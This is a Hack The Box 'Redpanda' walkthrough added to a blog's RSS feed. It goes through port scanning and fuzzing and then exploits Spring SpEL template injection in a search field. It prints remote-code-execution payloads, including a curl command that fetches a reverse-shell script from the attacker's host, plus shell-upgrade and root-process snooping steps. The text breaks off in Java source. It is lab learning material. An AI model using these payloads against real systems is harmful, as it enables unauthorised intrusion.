@@ -658,6 +658,382 @@ sh -c &#34;echo \$\$ &gt; /mnt/x/cgroup.procs&#34;
         </item>
         
         <item>
+            <title>Redpanda</title>
+            <link>https://mostxeon.github.io/posts/redpanda/</link>
+            <pubDate>Sun, 27 Nov 2022 08:06:04 +0200</pubDate>
+            
+            <guid>https://mostxeon.github.io/posts/redpanda/</guid>
+            <description>false</description>
+            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Starting with a full tcp port scan, I got the following result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.170
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-11-27 08:32 EET
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.170
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48add5b83a9fbcbef7e8201ef6bfdeae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7896c0b20ed49b2c1867c2992741c1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18cd9d08a621a8b8b6f79f8d405154fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GetRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> 
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html;charset<span style="color:#f92672">=</span>UTF-8
+</span></span><span style="display:flex;"><span>|     Content-Language: en-US
+</span></span><span style="display:flex;"><span>|     Date: Sun, <span style="color:#ae81ff">27</span> Nov <span style="color:#ae81ff">2022</span> 06:39:50 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> dir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ltr&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;meta author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wooden_k&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/panda.css&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/main.css&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
+</span></span><span style="display:flex;"><span>|     &lt;body&gt;
+</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pande&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear left&#39;</span>&gt;&lt;/div&gt;
+</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear right&#39;</span>&gt;&lt;/div&gt;
+</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers left&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/div&gt;
+</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers right&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
+</span></span><span style="display:flex;"><span>|     &lt;/div&gt;
+</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;face&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eye
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: GET,HEAD,OPTIONS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Sun, 27 Nov 2022 06:39:50 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   RTSPRequest: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 400 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html;charset=utf-8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Language: en
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 435
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Sun, 27 Nov 2022 06:39:50 GMT
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Request&lt;/title&gt;&lt;style type=&#34;text/css&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Red Panda Search | Made with Spring Boot
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port8080-TCP:V=7.93%I=7%D=11/27%Time=63830638%P=x86_64-pc-linux-gnu%r(G
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:etRequest,690,&#34;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;chars
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:et=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Sun,\x2027\x20Nov\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:02022\x2006:39:50\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20ht
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ml&gt;\n&lt;html\x20lang=\&#34;en\&#34;\x20dir=\&#34;ltr\&#34;&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20author=\&#34;wood
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:en_k\&#34;&gt;\n\x20\x20\x20\x20&lt;!--Codepen\x20by\x20khr2003:\x20https://codep
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:en\.io/khr2003/pen/BGZdXw\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;styles
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:heet\&#34;\x20href=\&#34;css/panda\.css\&#34;\x20type=\&#34;text/css\&#34;&gt;\n\x20\x20\x20\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/main\.css\&#34;\x20type=\&#34;text/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:css\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Red\x20Panda\x20Search\x20\|\x20Made\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:with\x20Spring\x20Boot&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n\n\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;div\x20class=&#39;</span>pande<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20cla
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ss=&#39;</span>ear<span style="color:#ae81ff">\x</span>20left<span style="color:#e6db74">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>ear<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:right<span style="color:#e6db74">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style="color:#ae81ff">\x</span>20left<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style="color:#ae81ff">\x</span>20right<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\x20
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>face<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20\x20\x20\x20&lt;div\x20class=&#39;</span>eye<span style="color:#e6db74">&#34;)%r(HTTPOptions,75,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20200<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20GET,HEAD,OPTIONS<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20S
+</span></span><span style="display:flex;"><span>SF:un,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Nov<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2006:39:50<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,24E,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text
+</span></span><span style="display:flex;"><span>SF:/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Language:<span style="color:#ae81ff">\x</span>20en<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2043</span>
+</span></span><span style="display:flex;"><span>SF:5<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Sun,<span style="color:#ae81ff">\x</span>2027<span style="color:#ae81ff">\x</span>20Nov<span style="color:#ae81ff">\x</span>202022<span style="color:#ae81ff">\x</span>2006:39:50<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connectio
+</span></span><span style="display:flex;"><span>SF:n:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html&gt;&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;&lt;head&gt;&lt;title&gt;
+</span></span><span style="display:flex;"><span>SF:HTTP<span style="color:#ae81ff">\x</span>20Status<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request&lt;/title&gt;&lt;style<span style="color:#ae81ff">\x</span>
+</span></span><span style="display:flex;"><span>SF:20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/css<span style="color:#ae81ff">\&#34;</span>&gt;body<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-family:Tahoma,Arial,sans-serif;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h
+</span></span><span style="display:flex;"><span>SF:1,<span style="color:#ae81ff">\x</span>20h2,<span style="color:#ae81ff">\x</span>20h3,<span style="color:#ae81ff">\x</span>20b<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>color:white;background-color:#525D76;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h1<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20<span style="color:#f92672">{</span>font-size:22px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h2<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:16px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h3<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:14p
+</span></span><span style="display:flex;"><span>SF:x;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20p<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:12px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>color:black;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\.</span>line<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>heig
+</span></span><span style="display:flex;"><span>SF:ht:1px;background-color:#525D76;border:none;<span style="color:#f92672">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;H
+</span></span><span style="display:flex;"><span>SF:TTP<span style="color:#ae81ff">\x</span>20Status<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request&lt;/h1&gt;&lt;/body&gt;&lt;/htm
+</span></span><span style="display:flex;"><span>SF:l&gt;<span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 469.78 seconds
+</span></span></span></code></pre></div><p>There are 2 open ports <em>22</em> running SSH and <em>8080</em> running a web server.</p>
+<h3 id="surfing-the-webpage">Surfing the Webpage</h3>
+<p>It appears that the web server is an application that has some blogs and their authors, and has a search functionality to search for blogs.</p>
+<p><img src="home_page.png" alt="Home Page"></p>
+<p>Trying to search for <em>h</em> character:</p>
+<p><img src="search_1.png" alt="Trying To Search"></p>
+<h3 id="noticing-weird-error">Noticing Weird Error</h3>
+<p>Intercepting the request with <em>Burp Suite</em>:</p>
+<p><img src="intercept_request_using_burp.png" alt="Intercepting The Request"></p>
+<p>Its a post request that takes <em>name</em> as post parameter. What I&rsquo;ll do is to try to inject this parameter with different <em>characters</em> and see if the application behaves differently on a certain character which might indicate an injection possibility.</p>
+<p>Using <em>Wfuzz</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ wfuzz -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -u http://10.10.11.170:8080/search -X POST -d <span style="color:#e6db74">&#39;name=FUZZ&#39;</span> --hc <span style="color:#ae81ff">200</span> --zE urlencode
+</span></span><span style="display:flex;"><span> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>* Wfuzz 3.1.0 - The Web Fuzzer                         *
+</span></span><span style="display:flex;"><span>********************************************************
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Target: http://10.10.11.170:8080/search
+</span></span><span style="display:flex;"><span>Total requests: 95
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=====================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>000000009:   <span style="color:#ae81ff">500</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">120</span> Ch      <span style="color:#e6db74">&#34;%29&#34;</span>                                                                                                                                              
+</span></span><span style="display:flex;"><span>000000060:   <span style="color:#ae81ff">500</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">120</span> Ch      <span style="color:#e6db74">&#34;%5C&#34;</span>                                                                                                                                              
+</span></span><span style="display:flex;"><span>000000091:   <span style="color:#ae81ff">500</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">120</span> Ch      <span style="color:#e6db74">&#34;%7B&#34;</span>                                                                                                                                              
+</span></span><span style="display:flex;"><span>000000093:   <span style="color:#ae81ff">500</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">3</span> W        <span style="color:#ae81ff">120</span> Ch      <span style="color:#e6db74">&#34;%7D&#34;</span>                                                                                                                                              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Total time: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Processed Requests: <span style="color:#ae81ff">95</span>
+</span></span><span style="display:flex;"><span>Filtered Requests: <span style="color:#ae81ff">91</span>
+</span></span><span style="display:flex;"><span>Requests/sec.: <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>There are 4 characters that crashes the application:</p>
+<pre tabindex="0"><code>%29  =&gt;  )
+%5C  =&gt;  \
+%7B  =&gt;  {
+%7D  =&gt;  }
+</code></pre><h3 id="knowing-that-the-backend-is-spring-boot">Knowing That The Backend Is Spring Boot</h3>
+<p>Looking at the error to see if it discloses some information about the server:</p>
+<p><img src="500_error.png" alt="Error 500"></p>
+<p>It doesn&rsquo;t, however if I search for the error on google, I can see that it relates to <em>Spring Boot Java Application</em>:</p>
+<p><img src="spring_boot_error_search.png" alt="Searching For Error"></p>
+<p>Sprin Boot is well know for its <em>Framework</em> that uses <em>Expression Language</em>, and these characters are usually used in <em>Template Expressions</em>. In addition since I can see that my search input is reflected back in the page, this might indicate that <em>my input is being placed within a template expression</em>, so I can try to inject it and see if I get a valid injection response back.</p>
+<ul>
+<li>References for <em>Server Side Template Injection</em> vulnerability: <em>
+
+<a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection" target="_blank">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></em></li>
+</ul>
+<h2 id="exploiting-ssti">Exploiting SSTI</h2>
+<p>After trying some payloads I got a valid hit usinng <em>*{ 7 * 7 }</em> which resulted in a response of <em>&ldquo;You searched for 49&rdquo;</em> meaning that the application is executing my input:</p>
+<p><img src="stti_testing_injection.png" alt="Injection Testing"></p>
+<p>Now, searching for specific <em>Spring Boot</em> payloads to get code execution, I found this: <em>
+
+<a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java" target="_blank">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-framework-java</a></em></p>
+<p>A payload like the below can achieve code remote execution on the server, executing the <code>id</code> command:
+<code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}</code></p>
+<p><img src="id_command.png" alt="id Command Execution"></p>
+<h3 id="getting-reverse-shell">Getting Reverse Shell</h3>
+<p>To get a reverse shell, I will first upload a bash reverse shell script to the target machine, make it executable and then execute it.</p>
+<p>The following payloads can achieve this:</p>
+<pre tabindex="0"><code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;curl http://10.10.16.2:8000/shell.sh -o /tmp/shell.sh&#39;).getInputStream())}
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;chmod +x /tmp/shell.sh&#39;).getInputStream())}
+
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;bash /tmp/shell.sh&#39;).getInputStream())}
+</code></pre><p><img src="getting_rce.png" alt="Getting RCE"></p>
+<p>Now, I will get a fully interactive shell using the below commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>$ <span style="color:#f92672">[</span>ctrl-z<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>$ stty raw -echo; fg
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#66d9ef">then</span> press enter<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><img src="getting_full_tty_shell.png" alt="Getting Fully Interactive Shell"></p>
+<ul>
+<li>Sometimes you need to export the <em>TERM</em> environment variable to be able to clear the sceen using <code>clear</code> command: <code>export TERM=xterm</code>.</li>
+</ul>
+<h2 id="snooping-on-root-processes">Snooping On Root Processes</h2>
+<p>Using <code>pspy</code>, I can snoop on processes and see if there is any <em>job</em> being ran by <em>root</em> user:</p>
+<p><img src="running_pspy.png" alt="Running Pspy"></p>
+<p><em>root</em> user is running a <em>.jar</em> file belonging to the <em>credit-score LogParser</em> custom project, located in <em>/opt</em> directory.</p>
+<ul>
+<li><em>.jar</em> files are archive files that stores (or aggregates) <em>.class</em> java files and associated metadata and resources like text, images, etc.</li>
+<li><em>.class</em> java files are the compiled version of a java project&rsquo;s source code (usually java source code have the extension <em>.java</em>)</li>
+</ul>
+<h3 id="understanding-what-root-is-running">Understanding What Root Is Running</h3>
+<p>So, I&rsquo;ll take a look at the code of the project to see what it does:</p>
+<p><img src="seing_main_java_file.png" alt="Listing The File"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> JDOMException<span style="color:#f92672">,</span> IOException<span style="color:#f92672">,</span> JpegProcessingException <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        File log_fd <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> File<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/opt/panda_search/redpanda.log&#34;</span><span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        Scanner log_reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Scanner<span style="color:#f92672">(</span>log_fd<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>log_reader<span style="color:#f92672">.</span><span style="color:#a6e22e">hasNextLine</span><span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            String line <span style="color:#f92672">=</span> log_reader<span style="color:#f92672">.</span><span style="color:#a6e22e">nextLine</span><span style="color:#f92672">();</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span><span style="color:#f92672">(!</span>isImage<span style="color:#f92672">(</span>line<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span><span style="color:#f92672">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            Map parsed_data <span style="color:#f92672">=</span> parseLog<span style="color:#f92672">(</span>line<span style="color:#f92672">);</span>
+</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>parsed_data<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uri&#34;</span><span style="color:#f92672">));</span>
+</span></span><span style="display:flex;"><span>            String artist <span style="color:#f92672">=</span> getArtist<span style="color:#f92672">(</span>parsed_data<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;uri&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
